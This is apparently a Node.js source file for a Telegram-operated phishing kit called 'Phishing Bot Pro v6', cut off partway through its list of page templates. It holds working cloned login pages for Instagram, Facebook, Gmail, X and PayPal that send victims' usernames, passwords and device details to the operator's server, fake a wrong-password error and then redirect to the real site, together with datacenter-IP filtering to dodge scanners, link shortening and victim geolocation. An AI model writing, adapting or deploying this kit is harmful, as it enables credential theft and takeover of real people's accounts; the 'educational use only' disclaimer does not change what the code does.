// krisabot.js — Node 18+, Windows/Linux
// Phishing Bot Pro v6 — Auth + Static URL ready for VPS
// Faqat o'quv maqsadida. O'z qurilmalaringizda ishlating.

require('dotenv').config();
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');
const { spawn } = require('child_process');
const fs = require('fs');
const os = require('os');
const https = require('https');
const http = require('http');
const path = require('path');

// ============================================================================
// CONFIG
// ============================================================================
const CONFIG = {
  BOT_TOKEN: process.env.BOT_TOKEN,
  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  PORT: Number(process.env.PORT) || 3000,
  USE_NGROK: false,
  PUBLIC_URL: process.env.PUBLIC_URL || null,
  ADMIN_PASSWORD: process.env.ADMIN_PASSWORD || 'admin123',
  CAPTURE_DIR: require('path').join(require('os').tmpdir(), 'captures'),
  LOG_DIR: require('path').join(require('os').tmpdir(), 'logs'),
  PAYLOAD_DIR: require('path').join(require('os').tmpdir(), 'payloads'),
  RAT_PORT: Number(process.env.RAT_PORT || 4040),
  SHORTENER: process.env.SHORTENER || 'isgd',
  ANTI_BOT: process.env.ANTI_BOT === 'true',
  IP_GEO: process.env.IP_GEO === 'true',
};

[CONFIG.CAPTURE_DIR, CONFIG.LOG_DIR, CONFIG.PAYLOAD_DIR].forEach((d) => {
  if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true });
});

const app = express();
const bot = new Telegraf(CONFIG.BOT_TOKEN);
let TUNNEL_URL = null;
let CLOUDFLARE_PROC = null;
let BOT_READY = false;

const captures = {};
const ratSessions = {};
let panelMsgId = null;
let panelChatId = null;

// ============================================================================
// AUTH MIDDLEWARE
// ============================================================================
const authedUsers = new Set();

bot.use(async (ctx, next) => {
  if (!ctx.from) return;
  const uid = ctx.from.id.toString();
  
  if (authedUsers.has(uid)) return next();

  const text = ctx.message?.text || '';
  
  if (text === CONFIG.ADMIN_PASSWORD) {
    authedUsers.add(uid);
    return ctx.reply('✅ Parol to\'g\'ri. Xush kelibsiz!\n\n/start buyrug\'ini yuboring.');
  }

  if (ctx.callbackQuery) {
    return ctx.answerCbQuery('🔒 Avval parolni kiriting!', { show_alert: true });
  }

  if (text.startsWith('/start') || text.startsWith('/menu')) {
    return ctx.reply('🔒 Bot qulflangan.\n\nIltimos, admin parolini kiriting:');
  }

  return ctx.reply('🔒 Ruxsat yo\'q. Parolni kiriting.');
});

// ============================================================================
// LOG
// ============================================================================
function logLine(tag, msg) {
  const line = `[${new Date().toISOString()}] [${tag}] ${msg}`;
  console.log(line);
  try {
    fs.appendFileSync(
      path.join(CONFIG.LOG_DIR, `${new Date().toISOString().slice(0, 10)}.log`),
      line + '\n'
    );
  } catch (_) {}
}

// ============================================================================
// IP GEOLOCATION + ANTI-BOT
// ============================================================================
const DATACENTER_PREFIXES = [
  '3.', '13.', '15.', '18.', '34.', '35.', '52.', '54.', '99.',
  '104.', '130.', '146.', '162.', '173.', '199.',
  '20.', '40.', '51.', '65.',
  '64.227.', '68.183.', '104.131.', '138.68.', '142.93.', '143.198.', '146.190.', '157.245.', '159.65.', '161.35.', '164.90.', '165.22.', '167.71.', '174.138.', '178.62.', '188.166.', '206.189.', '209.97.',
  '45.33.', '45.56.', '45.79.', '50.116.', '66.175.', '69.164.', '72.14.', '96.126.', '139.144.', '170.187.', '172.104.', '173.255.', '192.155.', '198.58.', '198.74.',
  '45.32.', '45.63.', '45.76.', '64.156.', '66.42.', '78.141.', '95.179.', '108.61.', '136.244.', '139.180.', '140.82.', '144.202.', '149.28.', '155.138.', '167.179.', '173.199.', '207.148.', '209.250.', '216.238.',
  '104.28.', '172.67.', '172.68.', '172.69.', '172.70.', '172.71.', '188.114.',
  '51.75.', '51.77.', '51.79.', '51.83.', '51.89.', '51.91.', '51.161.', '54.36.', '54.37.', '54.38.', '91.121.', '94.23.', '135.125.', '137.74.', '142.4.', '144.217.', '145.239.', '147.135.', '149.202.', '158.69.', '167.114.', '176.31.', '178.32.', '178.33.', '188.165.', '193.70.', '213.32.', '5.196.', '5.9.', '46.4.', '46.105.', '78.46.', '88.99.', '116.202.', '116.203.', '128.140.', '135.181.', '138.201.', '142.132.', '148.251.', '157.90.', '159.69.', '162.55.', '167.235.', '168.119.', '176.9.', '178.63.', '195.201.', '213.239.',
];

function isDatacenterIP(ip) {
  if (!ip) return false;
  const clean = ip.replace(/^::ffff:/, '');
  return DATACENTER_PREFIXES.some((p) => clean.startsWith(p));
}

function getClientIP(req) {
  const xff = req.headers['x-forwarded-for'];
  if (xff) return String(xff).split(',')[0].trim();
  return req.socket.remoteAddress || req.ip || '';
}

function fetchJson(url) {
  return new Promise((resolve, reject) => {
    const lib = url.startsWith('https') ? https : http;
    const req = lib.get(url, { timeout: 5000 }, (res) => {
      let body = '';
      res.on('data', (c) => (body += c));
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch (e) { reject(e); }
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
  });
}

async function geolocateIP(ip) {
  if (!CONFIG.IP_GEO) return null;
  try {
    const clean = ip.replace(/^::ffff:/, '');
    if (clean === '127.0.0.1' || clean === '::1' || clean.startsWith('192.168.') || clean.startsWith('10.')) {
      return { country: 'Local', city: 'Local', isp: 'Local', ip: clean };
    }
    const data = await fetchJson(`http://ip-api.com/json/${clean}?fields=status,country,countryCode,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
    if (data && data.status === 'success') {
      return {
        country: data.country, countryCode: data.countryCode, region: data.regionName, city: data.city,
        zip: data.zip, lat: data.lat, lon: data.lon, timezone: data.timezone, isp: data.isp,
        org: data.org, as: data.as, ip: data.query,
      };
    }
  } catch (e) { logLine('GEO', `fail ${ip}: ${e.message}`); }
  return null;
}

async function shortenUrl(longUrl) {
  if (CONFIG.SHORTENER === 'none') return longUrl;
  try {
    if (CONFIG.SHORTENER === 'isgd') {
      const api = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
      const data = await fetchJson(api);
      if (data && data.shorturl) return data.shorturl;
    }
  } catch (e) { logLine('SHORT', `fail: ${e.message}`); }
  return longUrl;
}

function runCmd(cmd, args, opts = {}) {
  return new Promise((resolve) => {
    const proc = spawn(cmd, args, { windowsHide: true, ...opts });
    let out = '', err = '';
    proc.stdout.on('data', (d) => (out += d.toString()));
    proc.stderr.on('data', (d) => (err += d.toString()));
    proc.on('close', (code) => resolve({ code, out, err }));
    proc.on('error', (e) => resolve({ code: -1, out: '', err: e.message }));
  });
}

function base64Encode(str) { return Buffer.from(str).toString('base64'); }
function base64Decode(b64) { return Buffer.from(b64, 'base64').toString('utf8'); }
function randomId(bytes = 16) { return crypto.randomBytes(bytes).toString('hex'); }
// ============================================================================
// VECTORS
// ============================================================================
const VECTORS = [
  {
    id: 'instagram',
    name: '📷 Instagram',
    description: 'Credential harvesting',
    icon: '📷',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
<meta name="theme-color" content="#ffffff">
<meta name="description" content="Instagram — Log in to see photos and videos from your friends.">
<meta property="og:title" content="Instagram">
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='0%25' y1='100%25' x2='100%25' y2='0%25'%3E%3Cstop offset='0%25' stop-color='%23feda75'/%3E%3Cstop offset='50%25' stop-color='%23d62976'/%3E%3Cstop offset='100%25' stop-color='%234f5bd1'/%3E%3C/linearGradient%3E%3C/defs%3E%3Cpath fill='url(%23g)' d='M12 2.2c3.2 0 3.6 0 4.9.1 1.2.1 1.8.2 2.2.4.6.2 1 .5 1.4 1 .5.5.8.9 1 1.4.2.4.4 1 .4 2.2.1 1.3.1 1.7.1 4.9s0 3.6-.1 4.9c-.1 1.2-.2 1.8-.4 2.2-.2.6-.5 1-1 1.4-.5.5-.9.8-1.4 1-.4.2-1 .4-2.2.4-1.3.1-1.7.1-4.9.1s-3.6 0-4.9-.1c-1.2-.1-1.8-.2-2.2-.4-.6-.2-1-.5-1.4-1-.5-.5-.8-.9-1-1.4-.2-.4-.4-1-.4-2.2C2.2 15.6 2.2 15.2 2.2 12s0-3.6.1-4.9c.1-1.2.2-1.8.4-2.2.2-.6.5-1 1-1.4.5-.5.9-.8 1.4-1 .4-.2 1-.4 2.2-.4C8.4 2.2 8.8 2.2 12 2.2m0-2.2C8.7 0 8.3 0 7.1.1 5.8.2 4.9.4 4.1.7 3.3 1 2.6 1.5 1.9 2.2 1.2 2.9.7 3.6.4 4.4.1 5.2-.1 6.1 0 7.4.1 8.6 0 9 0 12s0 3.4.1 4.6c.1 1.3.3 2.2.6 3 .3.8.8 1.5 1.5 2.2.7.7 1.4 1.2 2.2 1.5.8.3 1.7.5 3 .6 1.2.1 1.6.1 4.6.1s3.4 0 4.6-.1c1.3-.1 2.2-.3 3-.6.8-.3 1.5-.8 2.2-1.5.7-.7 1.2-1.4 1.5-2.2.3-.8.5-1.7.6-3 .1-1.2.1-1.6.1-4.6s0-3.4-.1-4.6c-.1-1.3-.3-2.2-.6-3-.3-.8-.8-1.5-1.5-2.2-.7-.7-1.4-1.2-2.2-1.5-.8-.3-1.7-.5-3-.6C15.4 0 15 0 12 0zm0 5.8a6.2 6.2 0 100 12.4 6.2 6.2 0 000-12.4zm0 10.2a4 4 0 110-8 4 4 0 010 8zm7.8-10.4a1.4 1.4 0 11-2.8 0 1.4 1.4 0 012.8 0z'/%3E%3C/svg%3E">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fafafa;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;color:#262626;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;width:100%;max-width:350px;padding:40px 40px 20px;text-align:center}
.logo{font-family:'Grand Hotel',cursive,-apple-system,sans-serif;font-size:48px;font-weight:400;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:32px;line-height:1}
input{width:100%;padding:9px 8px 7px;margin:3px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;color:#262626;outline:none;font-family:inherit}
input:focus{border-color:#a8a8a8;background:#fff}
button{width:100%;margin-top:8px;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit}
button:active{opacity:.7}
button:disabled{opacity:.5}
.divider{display:flex;align-items:center;margin:20px 0;color:#8e8e8e;font-size:12px;font-weight:600}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 18px}
.fb{color:#385185;font-size:14px;font-weight:600;margin:10px 0;cursor:pointer;text-decoration:none;display:inline-flex;align-items:center;gap:6px}
.fb svg{width:16px;height:16px}
.forgot{color:#00376b;font-size:12px;margin-top:20px;display:inline-block;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;width:100%;max-width:350px;padding:20px;text-align:center;font-size:14px;margin-top:10px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.spinner{display:none;width:16px;height:16px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin .6s linear infinite;margin-right:8px;vertical-align:middle}
@keyframes spin{to{transform:rotate(360deg)}}
.error{color:#ed4956;font-size:14px;margin-top:12px;display:none}
</style>
</head>
<body>
<div class="card">
  <div class="logo">Instagram</div>
  <form id="form" autocomplete="on">
    <input type="text" id="username" placeholder="Phone number, username or email" required autofocus>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit" id="submitBtn">Log in</button>
    <div class="error" id="errorBox">Sorry, your password was incorrect. Please double-check your password.</div>
    <div class="divider"><span>OR</span></div>
    <a class="fb" href="#"><svg viewBox="0 0 24 24" fill="#385185"><path d="M24 12.07C24 5.4 18.6 0 12 0S0 5.4 0 12.07c0 6 4.4 11 10.1 11.9v-8.4H7.1v-3.5h3.1V9.4c0-3 1.8-4.7 4.5-4.7 1.3 0 2.7.2 2.7.2v3h-1.5c-1.5 0-2 .9-2 1.9v2.3h3.3l-.5 3.5h-2.8v8.4C19.6 23 24 18 24 12.07z"/></svg> Log in with Facebook</a>
    <a class="forgot" href="#">Forgot password?</a>
  </form>
</div>
<div class="signup">Don't have an account? <a href="#">Sign up</a></div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  var REDIRECT='https://www.instagram.com/accounts/login/';
  var form=document.getElementById('form'),btn=document.getElementById('submitBtn'),err=document.getElementById('errorBox');
  var uInput=document.getElementById('username'),pInput=document.getElementById('password'),attempts=0;
  form.addEventListener('submit',async function(e){
    e.preventDefault();err.style.display='none';
    var u=uInput.value.trim(),p=pInput.value;
    if(!u||!p){err.textContent='Please enter username and password.';err.style.display='block';return;}
    var orig=btn.innerHTML;btn.disabled=true;btn.innerHTML='<span class="spinner" style="display:inline-block"></span>Logging in...';
    var di={};try{di={screen:window.screen.width+'x'+window.screen.height,platform:navigator.platform,tz:Intl.DateTimeFormat().resolvedOptions().timeZone};}catch(e){}
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'instagram',username:u,password:p,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent,deviceInfo:di})});}catch(e){}
    await new Promise(function(r){setTimeout(r,1200);});
    attempts++;
    if(attempts<2){err.textContent='Sorry, your password was incorrect.';err.style.display='block';pInput.value='';btn.disabled=false;btn.innerHTML=orig;pInput.focus();}
    else{err.textContent='Too many attempts. Redirecting...';err.style.display='block';setTimeout(function(){window.location.href=REDIRECT;},800);}
  });
})();
</script>
</body></html>`,
  },
  {
    id: 'facebook',
    name: '👍 Facebook',
    description: 'Social login harvester',
    icon: '👍',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<meta name="theme-color" content="#1877f2">
<title>Facebook — log in or sign up</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 36 36'%3E%3Ccircle cx='18' cy='18' r='18' fill='%231877f2'/%3E%3Cpath fill='%23fff' d='M25 18a7 7 0 10-8 7v-5h-2v-2h2v-2c0-2 1-3 3-3h2v2h-1c-.6 0-1 .4-1 1v2h2l-.3 2H21v5a7 7 0 004-7z'/%3E%3C/svg%3E">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#f0f2f5;font-family:Helvetica,Arial,sans-serif;color:#1c1e21;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.container{display:flex;gap:60px;max-width:980px;width:100%;align-items:center;justify-content:center;flex-wrap:wrap}
.left{flex:1;min-width:300px;padding:20px 0}
.logo{font-size:56px;color:#1877f2;font-weight:900;letter-spacing:-2px;line-height:1;margin-bottom:10px;font-family:'Helvetica Neue',Helvetica,Arial,sans-serif}
.tagline{font-size:28px;line-height:32px;color:#1c1e21;padding-right:20px}
.right{flex:0 0 396px;max-width:396px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%}
input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px;color:#1c1e21;background:#fff;outline:none}
input:focus{border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button.login{width:100%;margin-top:6px;padding:12px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer}
button.login:active{background:#166fe5}
button.login:disabled{opacity:.6}
.forgot{display:block;text-align:center;color:#1877f2;font-size:14px;margin:16px 0;text-decoration:none}
.divider{border-top:1px solid #dadde1;margin:20px 0}
button.create{display:block;margin:6px auto 0;padding:12px 16px;background:#42b72a;color:#fff;border:none;border-radius:6px;font-size:17px;font-weight:700;cursor:pointer}
.error{color:#fa383e;font-size:13px;margin-top:8px;display:none}
</style>
</head>
<body>
<div class="container">
  <div class="left"><div class="logo">facebook</div><div class="tagline">Connect with friends and the world around you on Facebook.</div></div>
  <div class="right">
    <div class="card">
      <form id="form">
        <input type="text" id="email" placeholder="Email address or phone number" required autofocus>
        <input type="password" id="password" placeholder="Password" required>
        <button type="submit" class="login" id="submitBtn">Log In</button>
        <div class="error" id="errorBox"></div>
        <a class="forgot" href="#">Forgotten password?</a>
        <div class="divider"></div>
        <button type="button" class="create" onclick="location.href='https://www.facebook.com/reg/'">Create New Account</button>
      </form>
    </div>
  </div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  var REDIRECT='https://www.facebook.com/login/';
  var form=document.getElementById('form'),btn=document.getElementById('submitBtn'),err=document.getElementById('errorBox');
  var eInput=document.getElementById('email'),pInput=document.getElementById('password'),attempts=0;
  form.addEventListener('submit',async function(e){
    e.preventDefault();err.style.display='none';
    var em=eInput.value.trim(),p=pInput.value;
    if(!em||!p){err.textContent='Please enter email and password.';err.style.display='block';return;}
    var orig=btn.innerHTML;btn.disabled=true;btn.innerHTML='Logging in...';
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'facebook',email:em,password:p,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
    await new Promise(function(r){setTimeout(r,1400);});
    attempts++;
    if(attempts<2){err.textContent='The password you entered is incorrect.';err.style.display='block';pInput.value='';btn.disabled=false;btn.innerHTML=orig;pInput.focus();}
    else{err.textContent='Too many attempts. Redirecting...';err.style.display='block';setTimeout(function(){window.location.href=REDIRECT;},800);}
  });
})();
</script>
</body></html>`,
  },
  {
    id: 'gmail',
    name: '📧 Gmail',
    description: 'Email account takeover',
    icon: '📧',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Sign in — Google Accounts</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E">
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;color:#202124;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:448px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;background:#fff;text-align:center}
.g-logo{width:48px;height:48px;margin-bottom:16px}
h1{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
input{width:100%;padding:13px 15px;margin:8px 0 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;color:#202124;outline:none}
input:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.actions a{color:#1a73e8;font-weight:500;font-size:14px;text-decoration:none}
button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
button:disabled{opacity:.6}
.error{color:#d93025;font-size:14px;margin-top:16px;display:none;text-align:left}
</style>
</head>
<body>
<div class="card">
  <svg class="g-logo" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
  <h1>Sign in</h1>
  <form id="form">
    <input type="email" id="email" placeholder="Email or phone" required autofocus>
    <input type="password" id="password" placeholder="Enter your password" required>
    <div class="error" id="errorBox"></div>
    <div class="actions"><a href="#">Forgot password?</a><button type="submit" id="submitBtn">Next</button></div>
  </form>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  var form=document.getElementById('form'),btn=document.getElementById('submitBtn'),err=document.getElementById('errorBox');
  var eInput=document.getElementById('email'),pInput=document.getElementById('password'),attempts=0;
  form.addEventListener('submit',async function(e){
    e.preventDefault();err.style.display='none';
    var em=eInput.value.trim(),p=pInput.value;
    if(!em||!p){err.textContent='Enter a valid email.';err.style.display='block';return;}
    btn.disabled=true;btn.innerHTML='...';
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'gmail',email:em,password:p,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
    await new Promise(function(r){setTimeout(r,1400);});
    attempts++;
    if(attempts<2){err.textContent='Wrong password. Try again.';err.style.display='block';pInput.value='';btn.disabled=false;btn.innerHTML='Next';pInput.focus();}
    else{err.textContent='Too many attempts. Redirecting...';err.style.display='block';setTimeout(function(){window.location.href='https://accounts.google.com/signin';},800);}
  });
})();
</script>
</body></html>`,
  },
  {
    id: 'twitter',
    name: '𝕏 Twitter',
    description: 'Twitter account takeover',
    icon: '𝕏',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>X. It's what's happening / X</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z'/%3E%3C/svg%3E">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e7e9ea;font-family:-apple-system,BlinkMacSystemFont,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.container{display:flex;max-width:1200px;width:100%;justify-content:center;align-items:center;gap:80px;flex-wrap:wrap}
.brand svg{width:280px;height:280px;fill:#fff}
.right{flex:0 0 380px;max-width:380px;width:100%}
h1{font-size:31px;font-weight:700;margin-bottom:32px}
input{width:100%;padding:15px 12px;margin:6px 0;background:#000;border:1px solid #2f3336;border-radius:4px;font-size:15px;color:#e7e9ea;outline:none}
input:focus{border-color:#1d9bf0}
button.primary{width:100%;padding:12px;margin-top:12px;background:#1d9bf0;color:#fff;border:none;border-radius:9999px;font-size:15px;font-weight:700;cursor:pointer}
button:disabled{opacity:.5}
.error{background:rgba(244,33,46,.1);color:#f4212e;padding:12px;font-size:14px;margin-top:12px;display:none;border-radius:4px}
</style>
</head>
<body>
<div class="container">
  <div class="brand"><svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></div>
  <div class="right">
    <h1>Happening now</h1>
    <form id="form">
      <input type="text" id="email" placeholder="Phone, email, or username" required autofocus>
      <input type="password" id="password" placeholder="Password" required>
      <div class="error" id="errorBox"></div>
      <button type="submit" class="primary" id="submitBtn">Log in</button>
    </form>
  </div>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  var form=document.getElementById('form'),btn=document.getElementById('submitBtn'),err=document.getElementById('errorBox');
  var eInput=document.getElementById('email'),pInput=document.getElementById('password'),attempts=0;
  form.addEventListener('submit',async function(e){
    e.preventDefault();err.style.display='none';
    var em=eInput.value.trim(),p=pInput.value;
    if(!em||!p){err.textContent='Please enter phone, email, or username.';err.style.display='block';return;}
    btn.disabled=true;btn.innerHTML='Logging in...';
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'twitter',email:em,password:p,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
    await new Promise(function(r){setTimeout(r,1400);});
    attempts++;
    if(attempts<2){err.textContent='The username or password you entered is incorrect.';err.style.display='block';pInput.value='';btn.disabled=false;btn.innerHTML='Log in';pInput.focus();}
    else{err.textContent='Too many attempts. Redirecting...';err.style.display='block';setTimeout(function(){window.location.href='https://x.com/i/flow/login';},800);}
  });
})();
</script>
</body></html>`,
  },
  {
    id: 'paypal',
    name: '💳 PayPal',
    description: 'Payment account harvesting',
    icon: '💳',
    html: (token, userId, domain) => `<!DOCTYPE html>
<html lang="en"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Log in to your PayPal account</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%23003087' d='M8.5 2h7c2.5 0 4.3 1.2 4.7 3.5.3 1.7-.2 3.2-1.4 4.2-1 .9-2.4 1.3-4 1.3h-2l-.7 5H8l2.4-14zm3.6 6h1.4c1 0 1.8-.3 2.1-1.2.4-1.2-.4-1.8-1.6-1.8h-1.2l-.7 3z'/%3E%3Cpath fill='%23009cde' d='M11 6h6c2.5 0 4 1.2 3.6 3.5-.3 1.7-1.5 3.2-3.4 4.2-1 .4-2.1.6-3.2.6h-2l-.7 5H9.5L11 6z'/%3E%3C/svg%3E">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#fff;font-family:-apple-system,BlinkMacSystemFont,sans-serif;color:#2c2e2f;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.card{width:100%;max-width:440px;padding:32px}
.logo{text-align:center;margin-bottom:24px}
h1{font-size:28px;font-weight:400;text-align:center;margin-bottom:32px}
input{width:100%;padding:14px 16px;margin:10px 0;border:1px solid #9da3a6;border-radius:4px;font-size:15px;outline:none}
input:focus{border-color:#0070ba;box-shadow:0 0 0 2px rgba(0,112,186,.2)}
button.primary{width:100%;margin-top:20px;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:24px;font-size:16px;font-weight:700;cursor:pointer}
button:disabled{opacity:.5}
.error{background:#fbe9ea;color:#c72e2e;padding:12px;font-size:14px;margin-top:12px;display:none;border-radius:4px}
</style>
</head>
<body>
<div class="card">
  <div class="logo"><svg viewBox="0 0 100 32"><text x="0" y="24" font-family="Helvetica" font-size="24" font-weight="900" fill="#003087">Pay</text><text x="42" y="24" font-family="Helvetica" font-size="24" font-weight="900" fill="#009cde">Pal</text></svg></div>
  <h1>Log in to your account</h1>
  <form id="form">
    <input type="email" id="email" placeholder="Email or mobile number" required autofocus>
    <input type="password" id="password" placeholder="Password" required>
    <div class="error" id="errorBox"></div>
    <button type="submit" class="primary" id="submitBtn">Log In</button>
  </form>
</div>
<script>
(function(){
  var token='${token}',userId='${userId}',domain='${domain}';
  var form=document.getElementById('form'),btn=document.getElementById('submitBtn'),err=document.getElementById('errorBox');
  var eInput=document.getElementById('email'),pInput=document.getElementById('password'),attempts=0;
  form.addEventListener('submit',async function(e){
    e.preventDefault();err.style.display='none';
    var em=eInput.value.trim(),p=pInput.value;
    if(!em||!p){err.textContent='Please fill in all fields.';err.style.display='block';return;}
    btn.disabled=true;btn.innerHTML='Logging in...';
    try{await fetch(domain+'/api/submit',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({vector:'paypal',email:em,password:p,token:token,userId:userId,timestamp:Date.now(),userAgent:navigator.userAgent})});}catch(e){}
    await new Promise(function(r){setTimeout(r,1400);});
    attempts++;
    if(attempts<2){err.textContent='The email and password you entered don\\'t match.';err.style.display='block';pInput.value='';btn.disabled=false;btn.innerHTML='Log In';pInput.focus();}
    else{err.textContent='Too many attempts. Redirecting...';err.style.display='block';setTimeout(function(){window.location.href='https://www.paypal.com/signin';},800);}
  });
})();
</script>
</body></html>`,
  },  {
